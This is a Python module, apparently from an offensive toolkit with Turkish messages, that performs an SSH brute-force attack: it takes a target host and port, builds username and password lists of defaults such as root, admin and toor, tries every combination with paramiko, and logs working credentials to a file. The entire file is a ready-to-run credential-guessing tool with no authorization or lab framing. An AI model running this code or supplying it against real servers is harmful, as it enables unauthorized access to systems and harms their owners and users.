# modules/bruteforce_ssh.py

import paramiko
import os
import time
import socket
from datetime import datetime
from urllib.parse import urlparse

WORDLIST_DIR = "wordlists"
USER_FILE = os.path.join(WORDLIST_DIR, "users.txt")
PASS_FILE = os.path.join(WORDLIST_DIR, "passwords.txt")

def log_new_entries(filename, items):
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    if not os.path.exists(filename):
        open(filename, "w").close()
    with open(filename, "r") as f:
        existing = set(line.strip() for line in f)
    new_items = set(items) - existing
    if new_items:
        with open(filename, "a") as f:
            for item in new_items:
                f.write(item + "\n")
        print(f"[+] {filename} dosyasına {len(new_items)} yeni veri eklendi.")

def generate_credentials():
    usernames = ["root", "admin", "user", "guest"]
    passwords = ["123456", "toor", "password", "admin2025"]
    log_new_entries(USER_FILE, usernames)
    log_new_entries(PASS_FILE, passwords)

def normalize_host(raw_input):
    """http:// veya https:// yazılmışsa, sadece host kısmını döndür"""
    if raw_input.startswith("http://") or raw_input.startswith("https://"):
        try:
            parsed = urlparse(raw_input)
            return parsed.hostname
        except Exception:
            return raw_input  # fallback
    return raw_input.strip()

def try_ssh_connection(ip, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        print(f"[✓] Giriş Başarılı → {username}:{password}")
        os.makedirs("logs", exist_ok=True)
        with open("logs/ssh_success.log", "a") as f:
            f.write(f"{datetime.now()} | {ip}:{port} | {username}:{password}\n")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Hatalı giriş → {username}:{password}")
    except paramiko.SSHException as e:
        print(f"[!] SSH bağlantı hatası: {e}")
    except socket.timeout:
        print(f"[!] Zaman aşımı: {ip}:{port}")
    except Exception as e:
        print(f"[!] Diğer hata: {e}")
    return False

def start_bruteforce():
    print("[🚀] SSH Brute-Force Başlatılıyor...\n")
    
    target_raw = input("[?] SSH hedef IP, domain veya URL girin: ").strip()
    target_host = normalize_host(target_raw)

    target_port = input("[?] SSH port (Varsayılan: 22): ").strip()
    target_port = int(target_port) if target_port else 22

    generate_credentials()

    try:
        usernames = open(USER_FILE).read().splitlines()
        passwords = open(PASS_FILE).read().splitlines()
    except Exception as e:
        print(f"[ERROR] Kullanıcı/parola listesi okunamadı: {e}")
        return

    try:
        for username in usernames:
            for password in passwords:
                success = try_ssh_connection(target_host, target_port, username, password)
                if success:
                    return  # Başarılıysa çık
                time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[!] Kullanıcı tarafından durduruldu.")
        return

    print("[X] Brute-force denemeleri başarısız.")

# Ana çalıştırma
if __name__ == "__main__":
    start_bruteforce()
